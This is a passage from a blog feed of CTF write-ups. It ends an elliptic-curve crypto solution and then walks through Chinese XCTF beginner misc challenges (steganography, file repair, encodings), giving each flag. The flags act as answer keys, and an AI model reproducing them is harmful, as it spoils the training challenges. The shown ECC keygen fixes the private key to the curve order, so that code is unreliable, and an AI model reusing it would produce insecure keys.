quotient = old_r // r</span><br><span class="line">       old_r, r = r, old_r - quotient * r</span><br><span class="line">       old_s, s = s, old_s - quotient * s</span><br><span class="line">       old_t, t = t, old_t - quotient * t</span><br><span class="line"></span><br><span class="line">   gcd, x, y = old_r, old_s, old_t</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> gcd == <span class="number">1</span></span><br><span class="line">   <span class="keyword">assert</span> (k * x) % p == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Functions that work on curve points #########################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_on_curve</span><span class="params">(point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns True if the given point lies on the elliptic curve."""</span></span><br><span class="line">   <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># None represents the point at infinity.</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">   x, y = point</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> (y * y - x * x * x - curve.a * x - curve.b) % curve.p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_neg</span><span class="params">(point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns -point."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># -0 = 0</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">   x, y = point</span><br><span class="line">   result = (x, -y % curve.p)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_add</span><span class="params">(point1, point2)</span>:</span></span><br><span class="line">   <span class="string">"""Returns the result of point1 + point2 according to the group law."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point1)</span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point2)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> point1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># 0 + point2 = point2</span></span><br><span class="line">       <span class="keyword">return</span> point2</span><br><span class="line">   <span class="keyword">if</span> point2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># point1 + 0 = point1</span></span><br><span class="line">       <span class="keyword">return</span> point1</span><br><span class="line"></span><br><span class="line">   x1, y1 = point1</span><br><span class="line">   x2, y2 = point2</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">       <span class="comment"># point1 + (-point1) = 0</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> x1 == x2:</span><br><span class="line">       <span class="comment"># This is the case point1 == point2.</span></span><br><span class="line">       m = (<span class="number">3</span> * x1 * x1 + curve.a) * inverse_mod(<span class="number">2</span> * y1, curve.p)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="comment"># This is the case point1 != point2.</span></span><br><span class="line">       m = (y1 - y2) * inverse_mod(x1 - x2, curve.p)</span><br><span class="line"></span><br><span class="line">   x3 = m * m - x1 - x2</span><br><span class="line">   y3 = y1 + m * (x3 - x1)</span><br><span class="line">   result = (x3 % curve.p,</span><br><span class="line">             -y3 % curve.p)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scalar_mult</span><span class="params">(k, point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns k * point computed using the double and point_add algorithm."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">       <span class="comment"># k * point = -k * (-point)</span></span><br><span class="line">       <span class="keyword">return</span> scalar_mult(-k, point_neg(point))</span><br><span class="line"></span><br><span class="line">   result = <span class="literal">None</span></span><br><span class="line">   addend = point</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> k:</span><br><span class="line">       <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">           <span class="comment"># Add.</span></span><br><span class="line">           result = point_add(result, addend)</span><br><span class="line"></span><br><span class="line">       <span class="comment"># Double.</span></span><br><span class="line">       addend = point_add(addend, addend)</span><br><span class="line"></span><br><span class="line">       k &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keypair generation and ECDHE ################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_keypair</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="string">"""Generates a random private-public key pair."""</span></span><br><span class="line">   private_key = curve.n</span><br><span class="line">   public_key = scalar_mult(private_key, curve.g)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> private_key, public_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_key, public_key = make_keypair()</span><br><span class="line">print(<span class="string">"private key:"</span>, hex(private_key))</span><br><span class="line">print(<span class="string">"public key: (0x&#123;:x&#125;, 0x&#123;:x&#125;)"</span>.format(*public_key))</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> ecc_calKey.py</span><br><span class="line">p=15424654874903</span><br><span class="line">a=16546484</span><br><span class="line">b=4548674875</span><br><span class="line">Gx=6478678675</span><br><span class="line">Gy=5636379357093</span><br><span class="line">k=546768</span><br><span class="line">private key: 0x857d0</span><br><span class="line">public key: (0xcb19fe553fa, 0x50545408eb4)</span><br><span class="line"></span><br><span class="line"><span class="variable">$python</span></span><br><span class="line">&gt;&gt;&gt; 0x50545408eb4+0xcb19fe553fa</span><br><span class="line">19477226185390</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-misc-wp</title>
      <link href="/2019/11/08/XCTF-adworld-misc-wp/"/>
      <url>/2019/11/08/XCTF-adworld-misc-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-amp-WriteUp"><a href="#Misc-amp-WriteUp" class="headerlink" title="Misc&amp;WriteUp"></a><center>Misc&amp;WriteUp</center></h1><p>msic永远充满了惊喜</p><h1 id="攻防世界-amp-Misc新手练习区"><a href="#攻防世界-amp-Misc新手练习区" class="headerlink" title="攻防世界&amp;Misc新手练习区"></a><center>攻防世界&amp;Misc新手练习区</center></h1><h2 id="0x01-this-is-flag"><a href="#0x01-this-is-flag" class="headerlink" title="0x01  this_is_flag"></a>0x01  this_is_flag</h2><blockquote><p>题目描述： Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9} </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/1.jpg" alt></p><p>易知flag为：<code>flag{th1s_!s_a_d4m0_4la9}</code></p><h2 id="0x02-ext3"><a href="#0x02-ext3" class="headerlink" title="0x02 ext3"></a>0x02 ext3</h2><blockquote><p>题目描述： 今天是菜狗的生日，他收到了一个linux系统光盘 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/2.jpg" alt></p><p>下载附件得到一个19.5MB的文件，由于题目是ext3，所以联想到将该文件挂载至linux下</p><p>运行<code>mount test /mnt/</code>,然后发现下面有一堆文件</p><p>执行<code>find |grep flag</code>，得到<code>./O7avZhikgKgbF/flag.txt</code></p><p>用<code>cat</code>命令查看文件，得到一串字符<code>ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</code></p><p>明显的base64编码，转码得到flag：<code>flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}</code></p><hr><p>但是看官方wp，发现是另外一种做法。</p><p>不知道为啥判断附件为img格式，然后用winhex打开该文件搜索flag得到如下</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/2_2.jpg" alt></p><p>然后解压该文件（我用bandzip没有打开，改后缀为img装载显示光盘映像已损坏），搜索得到flag.txt，然后其他步骤相同</p><h2 id="0x03-give-you-flag"><a href="#0x03-give-you-flag" class="headerlink" title="0x03  give_you_flag"></a>0x03  give_you_flag</h2><blockquote><p> 题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/3.jpg" alt></p><p>下载附件，发现是一个gif文件，打开查看发现在最后几秒闪过一个二维码</p><p>第一次做傻傻地用了linux下convert命令，将gif转到png，发现50多帧都被拆分成一个个png，</p><p>二维码大概在49帧，后面才发现有Stegsolve可以查看图片的每一帧</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/3_2.jpg" style="zoom:50%;"></p><p>明显是个二维码，修补其三角定位，得到下图</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/3_3.jpg" style="zoom:50%;"></p><p>扫码得到flag：<code>flag{e7d478cf6b915f50ab1277f78502a2c5}</code> </p><h2 id="0x04-pdf"><a href="#0x04-pdf" class="headerlink" title="0x04 pdf"></a>0x04 pdf</h2><blockquote><p> 题目描述：菜猫给了菜狗一张图，说图下面什么都没有 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/4.jpg" style="zoom:50%;"></p><p>打开附件是一个pdf，里面是一张图片，推测将pdf转为word格式之后，移走图片，发现flag就在图片底下</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/4_2.jpg" style="zoom:50%;"></p><p>易知得到flag：<code>flag{security_through_obscurity}</code></p><h2 id="0x05-stegano"><a href="#0x05-stegano" class="headerlink" title="0x05 stegano"></a>0x05 stegano</h2><blockquote><p> 题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/5.jpg" style="zoom:50%;"></p><p>打开附件发现一份文档</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/5_2.jpg" style="zoom: 25%;"></p><p>一开始没有思路，就先用之前的convert命令，将pdf的东西全部复制出来查看，发现</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/5_3.jpg" alt></p><p>将AB转换为. - 可得到如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--</span><br></pre></td></tr></table></figure><p>解摩斯密码得到：<code>CONGRATULATIONSFLAG1NV151BL3M3554G3</code></p><p>flag为：<code>flag{1NV151BL3M3554G3}</code></p><h2 id="0x06-SimpleRAR"><a href="#0x06-SimpleRAR" class="headerlink" title="0x06  SimpleRAR"></a>0x06  SimpleRAR</h2><blockquote><p> 题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层) </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/6.jpg" style="zoom:50%;"></p><p>下载完附件，只有一个文件，打开<code>flag.txt</code> ,里面写着<code>flag is not here</code></p><p>打开winhex查看该rar，发现里面还有一个secret.png，然后根据文件头（或者使用rar修复） 将A8 3C 7A 修改为 A8 3C 74 。 </p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/6_3.jpg"></p><p>然后解压得到secret.png，打开是一个空白图片，便想到用winhex查看。</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/6_2.jpg" alt></p><p>发现文件头是GIF，将后缀改为.gif，然后用Stegsolve分离出两帧图片，分别是二维码的上下部分，还少定位符，补齐定位符，扫码得到flag：<code>flag：flag{yanji4n_bu_we1shi}</code></p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/6_4.jpg" alt></p><h2 id="0x07-坚持60s"><a href="#0x07-坚持60s" class="headerlink" title="0x07 坚持60s"></a>0x07 坚持60s</h2><blockquote><p> 题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/7.jpg" style="zoom:50%;"></p><p>下下来是一个jar包，用java运行，发现是一个小游戏，根据题目联想需要坚持60s。</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/7_2.jpg" style="zoom:25%;"></p><p>玩了几次之后手残放弃，然后解压缩文件，用winhex打开文件搜索flag，在<code>/cn/bjsxt/plane/PlaneGameFrame.class</code>里找到   <code>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</code>易知是base64编码，base64decode得到<code>flag{DajiDali_JinwanChiji}</code></p><p>第二种办法，我在找到flag后思考这是misc题也不是逆向题，便觉得这游戏肯定有bug，然后根据常识发现右边和下面的边界可以穿过来躲避障碍，但是完全卡入右边界之后无法返回。</p><p>之后发现到下边只能卡入一半，于是突发思维，将小方块卡入右下角然后留下了一个小角，发现可以成功躲过60s（记得计时，在60s~70s时主动出去死亡即可，然后成功得到flag明文</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/7_4.jpg" style="zoom: 25%;"></p><h2 id="0x08-gif"><a href="#0x08-gif" class="headerlink" title="0x08 gif"></a>0x08 gif</h2><blockquote><p> 题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/8.jpg" style="zoom:50%;"></p><p>得到一个zip包，查看里面有103张黑白色的图片，联想到二进制。</p><p>白色图片代表0，黑色图片代表1。</p><p>01100110前八位二进制换算后为 f 证明思路正确。</p><p>01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</p><p>二进制转字符串得到 flag：<code>flag{FuN_giF}</code></p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/8_2.jpg" style="zoom:50%;"></p><h2 id="0x09-掀桌子"><a href="#0x09-掀桌子" class="headerlink" title="0x09  掀桌子"></a>0x09  掀桌子</h2><blockquote><p> 题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻ </p></blockquote><p> 题目只有描述中这一段字符串有信息，推测是十六进制，写python的转换代码</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/9.jpg" alt></p><p> 每两个一组，将16进制转换为10进制，减去128以后输出 ascii。 </p><p>得到<code>Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</code></p><h2 id="0x0a-如来十三掌"><a href="#0x0a-如来十三掌" class="headerlink" title="0x0a  如来十三掌"></a>0x0a  如来十三掌</h2><blockquote><p> 题目描述：菜狗为了打败菜猫，学了一套如来十三掌。 </p></blockquote><p>下下来附件是一个docx，发现是一段文字，贼像佛教里的文字</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/10_2.jpg" style="zoom: 50%;"></p><p>搜索得到这是一种佛语加密，在网站 <a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx</a>  <a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener"><strong>与佛论禅</strong></a>  可以翻译，但是将全文复制到chrome和firefox打开的网站里都解码失败了，后看他的说明，推测应该在复制过程中会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。试验过在MicrosoftEdge中能够成功解码。</p><p> 解完是一串像base64编码的字符<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code>，但是该字符解码得到是一串乱码，然后发现这个字符串需要先用rot13（与题目“如来十三掌”谐音）转一下，然后再base64解码，得到flag。 </p><h2 id="0x0b-base64stego"><a href="#0x0b-base64stego" class="headerlink" title="0x0b  base64stego"></a>0x0b  base64stego</h2><blockquote><p> 题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/11.jpg" style="zoom:50%;"></p><p>打开压缩包，压缩包是伪加密的根据ctf-wiki里直接用winhex改一个标志位，或者用winrar修复即可</p><p>是一个<code>stego.txt</code>可以看到很多行的base64编码</p><p>解码出来是在wiki百科上对Steganography的解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">Steganography is the art and science of</span><br><span class="line"> writing hidden messages in such a way that no one</span><br><span class="line">, apart from the sender and intended recipient, suspe</span><br><span class="line">cts the existence of the mess</span><br><span class="line">age, a form of security through obscurity. T</span><br><span class="line">he word steganography is of Greek origin and means &quot;concea</span><br><span class="line">led writing&quot; from the Greek words steganos meaning &quot;co</span><br><span class="line">vered or protected&quot;, and graphein meaning &quot;to w</span><br><span class="line">rite&quot;. The first recorded use of the term was in 1499 by Joh</span><br><span class="line">annes Trithemius in his Steganographia, a trea</span><br><span class="line">tise on cryptography and steganography disg</span><br><span class="line">uised as a book on magic. Generally, mess</span><br><span class="line">ages will appear to be something else: images, arti</span><br><span class="line">cles, shopping lists, or some ot</span><br><span class="line">her covertext and, classically, the hidden message may be in invi</span><br><span class="line">sible ink between the visible lines of a private letter.</span><br><span class="line"></span><br><span class="line">The</span><br><span class="line"> advantage of steganography, over cr</span><br><span class="line">yptography alone, is that messages do not attract attention</span><br><span class="line"> to themselves. Plainly visible encrypted messages�no matter </span><br><span class="line">how unbreakable�will arouse s</span><br><span class="line">uspicion, and may in themselves be incriminating </span><br><span class="line">in countries where encryption is illegal. Therefore,</span><br><span class="line"> whereas cryptography protects the contents of</span><br><span class="line"> a message, steganography can be said to protect b</span><br><span class="line">oth messages and communicating parties.</span><br><span class="line"></span><br><span class="line">Steganography inclu</span><br><span class="line">des the concealment of information within com</span><br><span class="line">puter files. In digital steganography, electronic communication</span><br><span class="line">s may include steganographic coding insi</span><br><span class="line">de of a transport layer, such as a document file, image fil</span><br><span class="line">e, program or protocol. Media </span><br><span class="line">files are ideal for steganographic transmissio</span><br><span class="line">n because of their large size. As </span><br><span class="line">a simple example, a sender might start with a</span><br><span class="line">n innocuous image file and adjust the color of every 100th pixel </span><br><span class="line">to correspond to a letter in the alphabet, a</span><br><span class="line"> change so subtle that someone not specifically looking f</span><br><span class="line">or it is unlikely to notice it.</span><br><span class="line"></span><br><span class="line">The</span><br><span class="line"> first recorded uses of steganography can be tr</span><br><span class="line">aced back to 440 BC when Herodotus mentions two examples o</span><br><span class="line">f steganography in The Histories of </span><br><span class="line">Herodotus. Demaratus sent a warning about a </span><br><span class="line">forthcoming attack to Greece by w</span><br><span class="line">riting it directly on the wooden backing of a wax tablet bef</span><br><span class="line">ore applying its beeswax surface. Wax tablets were in common use</span><br><span class="line"> then as reusable writing surfaces, sometime</span><br><span class="line">s used for shorthand. Another ancient example is that o</span><br><span class="line">f Histiaeus, who shaved the head of his most trusted s</span><br><span class="line">lave and tattooed a message on it. After his hair had g</span><br><span class="line">rown the message was hidden. The purpose was to</span><br><span class="line"> instigate a revolt against the Persians.</span><br><span class="line"></span><br><span class="line">Steganography has b</span><br><span class="line">een widely used, including in recent historical times and t</span><br><span class="line">he present day. Possible permutations are endless and</span><br><span class="line"> known examples include:</span><br><span class="line">* Hidden messages within wax ta</span><br><span class="line">blets: in ancient Greece, people wrote me</span><br><span class="line">ssages on the wood, then covered it with wax upon which an innocen</span><br><span class="line">t covering message was written</span><br><span class="line">.</span><br><span class="line">* Hidden messages on messenger&apos;s body: also used in ancien</span><br><span class="line">t Greece. Herodotus tells the story o</span><br><span class="line">f a message tattooed on a slave&apos;s shaved head, hidden by the</span><br><span class="line"> growth of his hair, and exposed by shaving his head</span><br><span class="line"> again. The message allegedly carried a warning to Greece abo</span><br><span class="line">ut Persian invasion plans. Th</span><br><span class="line">is method has obvious drawbacks,</span><br><span class="line"> such as delayed transmission while waiting for the s</span><br><span class="line">lave&apos;s hair to grow, and the restrictions o</span><br><span class="line">n the number and size of mess</span><br><span class="line">ages that can be encoded on one person</span><br><span class="line">&apos;s scalp.</span><br><span class="line">* In WWII, the French Resistance sent some messages w</span><br><span class="line">ritten on the backs of couriers </span><br><span class="line">using invisible ink.</span><br><span class="line">* Hidden messages on paper wr</span><br><span class="line">itten in secret inks, under other messages</span><br><span class="line"> or on the blank parts of other</span><br><span class="line"> messages.</span><br><span class="line">* Messages written in Morse code on knitting yarn and </span><br><span class="line">then knitted into a piece of clothing wor</span><br><span class="line">n by a courier.</span><br><span class="line">* Messages written on the back o</span><br><span class="line">f postage stamps.</span><br><span class="line">* During and after</span><br><span class="line"> World War II, espionage agents used photographically p</span><br><span class="line">roduced microdots to send information back and</span><br><span class="line"> forth. Microdots were typically </span><br><span class="line">minute, approximately less than the size of the period prod</span><br><span class="line">uced by a typewriter. WWII microdots needed to be embedded</span><br><span class="line"> in the paper and covered with an adhesive (such as collodion). T</span><br><span class="line">his was reflective and thus detectable </span><br><span class="line">by viewing against glancing light. Alternative techniques included</span><br><span class="line"> inserting microdots into slits cut into the edge of</span><br><span class="line"> post cards.</span><br><span class="line">* During World War II, a spy for </span><br><span class="line">Japan in New York City, Velvalee</span><br><span class="line"> Dickinson, sent information to accommodatio</span><br><span class="line">n addresses in neutral South Americ</span><br><span class="line">a. She was a dealer in dolls, and </span><br><span class="line">her letters discussed how many of this or that doll</span><br><span class="line"> to ship. The stegotext was the doll orders, while the</span><br><span class="line"> concealed &quot;plaintext&quot; was itself enco</span><br><span class="line">ded and gave information about ship movements,</span><br><span class="line"> etc. Her case became somewhat fa</span><br><span class="line">mous and she became known as the</span><br><span class="line"> Doll Woman.</span><br><span class="line">* Cold War count</span><br><span class="line">er-propaganda. In 1968, crew membe</span><br><span class="line">rs of the USS Pueblo (AGER-2) intelligence ship held as pr</span><br><span class="line">isoners by North Korea, communicated in sign</span><br><span class="line"> language during staged photo opport</span><br><span class="line">unities, informing the United States they </span><br><span class="line">were not defectors but rather were being held ca</span><br><span class="line">ptive by the North Koreans. In other photo</span><br><span class="line">s presented to the US, crew members gave &quot;the finger&quot; to </span><br><span class="line">the unsuspecting North Koreans, in an attempt to </span><br><span class="line">discredit photos that showed them smi</span><br><span class="line">ling and comfortable.</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">http://en.wikipedia.org</span><br><span class="line">/wiki/Steganography</span><br></pre></td></tr></table></figure><p>推测是base64隐写，跑脚本得到flag：<code>flag{Base_sixty_four_point_five}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deStego</span><span class="params">(stegoFile)</span>:</span></span><br><span class="line">    b64table = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">    <span class="keyword">with</span> open(stegoFile,<span class="string">'r'</span>) <span class="keyword">as</span> stegoText:</span><br><span class="line">        message = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stegoText:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = line[line.index(<span class="string">"="</span>) - <span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                message += <span class="string">""</span>.join([ bin( <span class="number">0</span> <span class="keyword">if</span> i == <span class="string">'='</span> <span class="keyword">else</span> b64table.find(i))[<span class="number">2</span>:].zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])[<span class="number">2</span> <span class="keyword">if</span> text.count(<span class="string">'='</span>) ==<span class="number">2</span> <span class="keyword">else</span> <span class="number">4</span>:<span class="number">6</span>]  </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(int(message[i:i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(message),<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        print(deStego(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(deStego(<span class="string">"stego.txt"</span>))</span><br></pre></td></tr></table></figure><h2 id="0x0c-功夫再高也怕菜刀"><a href="#0x0c-功夫再高也怕菜刀" class="headerlink" title="0x0c  功夫再高也怕菜刀"></a>0x0c  功夫再高也怕菜刀</h2><blockquote><p> 题目描述：菜狗决定用菜刀和菜鸡决一死战 </p></blockquote><p><img src="/2019/11/08/XCTF-adworld-misc-wp/12.jpg" style="zoom:50%;"></p><p>下载附件发现是一个<code>.pcapng</code>文件，是一个wireshark流量包。</p><p>用wireshark打开，<code>ctrl+F</code>查找flag</p><p><img 